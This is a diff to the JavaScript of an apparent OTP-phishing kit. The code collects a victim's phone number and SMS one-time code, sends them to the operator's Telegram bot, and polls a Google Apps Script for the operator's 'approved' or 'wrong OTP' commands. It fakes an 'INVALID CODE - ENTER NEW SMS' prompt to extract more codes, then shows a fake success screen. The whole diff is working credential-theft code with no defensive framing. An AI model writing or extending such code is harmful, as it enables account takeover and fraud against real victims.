@@ -184,38 +184,44 @@ function startPolling(phone) {
             const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
             const status = (await r.text()).trim();
 
-            // 1. INITIAL APPROVAL
+            // 1. If Operator Approves Initial Hit
             if(status === "approved") {
                 showView(3);
                 runCountdown(30);
                 fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`); 
             }
 
+            // 2. If Operator Clicks "WRONG OTP" (The One-Time Trigger)
             if(status === "otp_error" && !isResetting) {
-    isResetting = true;
+                isResetting = true; // LOCK: Prevents multiple resets from one click
 
-    // KILL the 45-second "Success" timer so it doesn't jump to Stage 4
-    if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+                // IMMEDIATELY stop the 45-second auto-success timer
+                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
 
-    await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
+                // Tell the Google Script to delete the error so it doesn't loop
+                await fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
 
-    const timerEl = document.getElementById('timer');
-    timerEl.style.color = "yellow";
-    timerEl.innerText = "INVALID CODE - NEW SMS SENT";
-    
-    document.querySelectorAll('.otp-input').forEach(input => input.value = "");
-    
-    const btn = document.getElementById('otp-btn');
-    btn.innerText = "Confirm & Finish";
-    btn.disabled = false;
+                // --- UI FEEDBACK ---
+                const timerEl = document.getElementById('timer');
+                const btn = document.getElementById('otp-btn');
+                
+                timerEl.style.color = "yellow";
+                timerEl.innerText = "INVALID CODE - ENTER NEW SMS";
+                
+                // Clear inputs for the fresh attempt
+                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                
+                btn.innerText = "Confirm & Finish";
+                btn.disabled = false;
 
-    setTimeout(() => {
-        timerEl.style.color = "var(--tele-red)";
-        runCountdown(30);
-        isResetting = false;
-    }, 1500);
-}
-        } catch(e) { console.log("Polling error:", e); }
+                // Restart the 30s countdown and unlock the gate after 1.5s
+                setTimeout(() => {
+                    timerEl.style.color = "var(--tele-red)";
+                    runCountdown(30);
+                    isResetting = false; // UNLOCK: Ready for the NEXT manual click
+                }, 1500);
+            }
+        } catch(e) { console.error("Poll Error:", e); }
     }, 4000);
 }
 
@@ -263,32 +269,19 @@ async function sendOTP() {
 
     const phone = document.getElementById('user-id').value;
     const btn = document.getElementById('otp-btn');
-    const timerEl = document.getElementById('timer');
     
-    // 1. Enter "Verifying" state
+    // Switch to Verifying State
     btn.innerText = "VERIFYING... PLEASE WAIT";
     btn.disabled = true;
-    timerEl.innerText = "SECURE CHECK IN PROGRESS";
-    timerEl.style.color = "white";
 
-    // 2. Send the OTP to your Telegram
-    if(BOT_TOKEN && CHAT_ID) {
-        const msg = `🔓 *OTP RECEIVED*\n📱 Phone: ${phone}\n🔢 CODE: *${otpCode}*`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-    }
+    // Send to Telegram
+    const msg = `🔓 *OTP RECEIVED*\n📱 Phone: ${phone}\n🔢 CODE: *${otpCode}*`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // 3. Update Google Sheet
-    fetch(SCRIPT_URL, { 
-        method: 'POST', 
-        mode: 'no-cors', 
-        body: new URLSearchParams({ phone: phone, otp: otpCode, action: "saveOTP" }) 
-    });
-
-    // 4. THE 45-SECOND GATE
-    // If you do NOT click "Wrong OTP" within 45 seconds, it auto-approves
+    // The 45-second "Auto-Finish" (unless you click Wrong OTP)
     window.autoApproveTimeout = setTimeout(() => {
-        showView(4); // Show Success Screen
-    }, 45000); 
+        showView(4); 
+    }, 45000);
 }
 </script>
 
